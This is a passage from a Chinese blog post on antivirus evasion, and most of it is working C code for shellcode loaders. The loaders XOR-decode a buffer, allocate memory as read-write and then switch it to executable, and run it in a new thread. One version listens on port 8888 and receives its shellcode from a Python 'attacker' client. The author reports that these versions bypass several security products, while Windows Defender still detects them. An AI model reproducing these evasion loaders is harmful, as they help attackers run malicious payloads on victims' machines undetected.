+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/10.png" srcset="/img/loading.gif"></p>
+<h3 id="3-利用内存申请步骤优化来绕过部分安全软件"><a href="#3-利用内存申请步骤优化来绕过部分安全软件" class="headerlink" title="3.利用内存申请步骤优化来绕过部分安全软件"></a>3.利用内存申请步骤优化来绕过部分安全软件</h3><blockquote>
+<p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>	DWORD dwOldProtect;<br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    buf[i] ^= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//申请的内存只需要可读可写。</span><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE<br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">//将文件的属性改为可执行</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br>    <br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功上线：</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/4.png" srcset="/img/loading.gif"></p>
+<p>绕过某安全软件。</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/3.png" srcset="/img/loading.gif"></p>
+<p>杀毒没有查出。</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/8.png" srcset="/img/loading.gif"></p>
+<p>但在windows自带的防火墙<code>windows defender</code>给杀了。</p>
+<h3 id="4-利用windows的异或运算API-内存申请优化尝试"><a href="#4-利用windows的异或运算API-内存申请优化尝试" class="headerlink" title="4.利用windows的异或运算API+内存申请优化尝试"></a>4.利用windows的异或运算API+内存申请优化尝试</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinBase.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>    DWORD dwOldProtect; <span class="hljs-comment">// 内存页属性</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br><span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    <span class="hljs-comment">//Sleep(50);</span><br>    _InterlockedXor8(buf+i,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br><br><span class="hljs-comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span><br><span class="hljs-comment">//Sleep(2000);</span><br><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以绕过许多安全防护（火和60）软件，但还是逃不过<code>windows defender</code>。。。。。。。</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/6.png" srcset="/img/loading.gif"></p>
+<h2 id="4-分离-正向"><a href="#4-分离-正向" class="headerlink" title="4.分离-正向"></a>4.分离-正向</h2><p>​    这边分离的意思就是<code>shellcode</code>和加载器的分离。将其分成两个部分，将加载器程序作为服务端，将<code>shellcode</code>程序作为客户端，当服务端运行后，客户端可以远程将<code>shellcode</code>传入服务端执行。</p>
+<p>服务端：</p>
+<p>​    一开始本来要用写一个<code>RunCode</code>方法来封装申请内存、复制shellcode进内存、创建线程等操作的。但是发现火啥安全软件会直接杀掉，因此放弃。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><span class="hljs-comment">/*写如下函数封装会被火啥安全软件直接杀掉。。。。。</span><br><span class="hljs-comment">BOOL CODE_EXECUTE(CHAR * code,int shellcode_size)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    HANDLE hThread;</span><br><span class="hljs-comment">    DWORD dwOldProtect;</span><br><span class="hljs-comment">    DWORD dwThreadId;</span><br><span class="hljs-comment">    char* shellcode = (char* )VirtualAlloc(NULL,shellcode_size,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="hljs-comment">    CopyMemory(shellcode,code,shellcode_size);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    // 这里开始更改它的属性为可执行</span><br><span class="hljs-comment">        VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="hljs-comment">        // 执行Shellcode</span><br><span class="hljs-comment">        hThread = CreateThread(</span><br><span class="hljs-comment">            NULL, // 安全描述符</span><br><span class="hljs-comment">            NULL, // 栈的大小</span><br><span class="hljs-comment">            (LPTHREAD_START_ROUTINE)shellcode, // 函数</span><br><span class="hljs-comment">            NULL, // 参数</span><br><span class="hljs-comment">            NULL, // 线程标志</span><br><span class="hljs-comment">            &amp;dwThreadId // 线程ID</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="hljs-comment">        return TRUE;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, TCHAR argv[])</span></span>&#123;<br>    CHAR buf[<span class="hljs-number">801</span>];<br>    DWORD dwError;<br>    WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    SOCKET socks;<br>    SOCKET sClient;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>    INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>    SHORT sListenPort = <span class="hljs-number">8888</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br>    <span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br>    <span class="hljs-keyword">if</span> (socks == INVALID_SOCKET)<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br>    <span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;<br><br>    <span class="hljs-keyword">if</span>(bind(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>)) == SOCKET_ERROR )<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (listen(socks, <span class="hljs-number">5</span>) == SOCKET_ERROR)<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Listen  Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);<br>    <span class="hljs-keyword">int</span> ret = recv(sClient,buf,<span class="hljs-keyword">sizeof</span>(buf),<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Recv %d-Bytes \n&quot;</span>,ret);<br>        closesocket(sClient);<br>        closesocket(socks);<br>    &#125;<br><br>    WSACleanup();<br><br>    <span class="hljs-comment">//CODE_EXECUTE(buf,sizeof(buf));</span><br>	<span class="hljs-comment">//以下是执行shellcode的区域</span><br>    HANDLE hThread;<br>    DWORD dwOldProtect;<br>    DWORD dwThreadId;<br>	<span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-keyword">char</span>* shellcode = (<span class="hljs-keyword">char</span>* )VirtualAlloc(<span class="hljs-literal">NULL</span>,shellcode_size,MEM_COMMIT,PAGE_READWRITE);<br>    CopyMemory(shellcode,buf,shellcode_size);<br><br>    <span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>        VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>        hThread = CreateThread(<br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>            (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>            &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>        );<br>        WaitForSingleObject(hThread,INFINITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>​    服务端并没有被360给杀掉，但是火*会报警。</p>
+<p>​    将以上的代码进行优化后：</p>
+<p>就可以绕过火*了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, TCHAR argv[])</span></span>&#123;<br>    CHAR buf[<span class="hljs-number">801</span>];<br>    DWORD dwError;<br>    WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    SOCKET socks;<br>    SOCKET sClient;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>    INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>    SHORT sListenPort = <span class="hljs-number">8888</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br>	WSAStartup(sockVersion, &amp;wsaData);<br><br><br>    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br>    <span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;<br>	bind(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>));<br>	listen(socks, <span class="hljs-number">5</span>);<br><br>    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);<br>    <span class="hljs-keyword">int</span> ret = recv(sClient,buf,<span class="hljs-keyword">sizeof</span>(buf),<span class="hljs-number">0</span>);<br>	closesocket(sClient);<br>    closesocket(socks);<br>    WSACleanup();<br>    HANDLE hThread;<br>    DWORD dwOldProtect;<br>    DWORD dwThreadId;<br>	<span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-keyword">char</span>* shellcode = (<span class="hljs-keyword">char</span>* )VirtualAlloc(<span class="hljs-literal">NULL</span>,shellcode_size,MEM_COMMIT,PAGE_READWRITE);<br>    CopyMemory(shellcode,buf,shellcode_size);<br><br>    <span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>    VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>    hThread = CreateThread(<br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>          (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>          &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>     );<br>    WaitForSingleObject(hThread,INFINITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>客户端：攻击者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,sys<br><br>Host = <span class="hljs-string">&quot;192.168.199.122&quot;</span><br>Port = <span class="hljs-number">8888</span><br>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br><span class="hljs-keyword">try</span>:<br>    s.connect((Host,Port))<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    print(e)<br>    sys.exit()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>    s.send(shellcode)<br>    data = s.recv(<span class="hljs-number">1024</span>)<br>    data = data.decode()<br>    print(<span class="hljs-string">&quot;Server say:&quot;</span>,data)<br>s.close()<br></code></pre></td></tr></table></figure>
+<p>​    </p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/11.png" srcset="/img/loading.gif"></p>
+<p>但还是不能逃过被<code>windows defender</code>的查杀，一开始执行没有事情。但是只要客户端传入<code>shellcode</code>并开始执行的话，就会报警。</p>
+<h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nXrXjvkMtVzkkIIIXfd70w">https://mp.weixin.qq.com/s/nXrXjvkMtVzkkIIIXfd70w</a></p>
+<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/simple-separate-bypassav">https://idiotc4t.com/defense-evasion/simple-separate-bypassav</a></p>
+<p><a target="_blank" rel="noopener" href="https://payloads.online/">https://payloads.online/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E9%AA%91%E5%A3%ABCMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">漏洞复现-骑士CMS文件包含导致远程代码执行漏洞</span>
